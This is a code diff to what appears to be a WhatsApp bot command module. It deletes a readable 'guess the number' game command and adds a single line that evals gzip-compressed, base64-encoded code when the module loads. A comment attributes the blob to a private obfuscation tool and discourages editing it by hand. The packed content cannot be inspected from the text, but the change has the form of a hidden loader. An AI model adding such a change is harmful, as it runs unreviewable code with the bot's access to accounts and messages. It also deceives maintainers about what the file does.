@@ -1,9 +1,2 @@
-const games = require('../whatsapp/play');
-
-module.exports = {
-  name: 'guess',
-  category: 'games',
-  adminOnly: true, // only admins start a game, everybody can join it
-  description: 'Guess the number 1-100. Players type join, then send guesses (e.g. guess 5 = 5 rounds, guess solo)',
-  run: (ctx) => games.fromCommand(ctx, 'guess', { defaultRounds: 3 }),
-};
+// TFX-PACKED v1 (built by tools/obfuscate.private.js; do not edit by hand - edit the real source and run it again)
+eval(require('zlib').gunzipSync(Buffer.from('H4sIAAAAAAAAAz1QMW7DMAzc/QputgFVTlBkSZAuHTq26A8Ui3EUWKJLSW2MIH8vLRcdeXc83rGnEBMMxmOEIzB+ZcfY1Fp3PxeTopmmbhrNXLeHqvJk84gabxNxWuT3CiDI6h7qIWOMtRKgNwkH4nkBF9sCGutdeA+joIkzKug6IBlXIkJMhhOYEkQBfiPPJ7KzmAW4kgvgkrhYjD27KTkK4v62nIR0QQjZn5Bh+7TdbDR8SF5kYeYJy7JaRAEiBgslp3RtUA96nWAnVXbAlION6g+LNFJbonOWY02fbi0cX9ZP6TOTfyXvTbALo/77w11Cnk0e02ex28MzPFpVPQ7VL1F1jXxqAQAA', 'base64')).toString('utf8'));
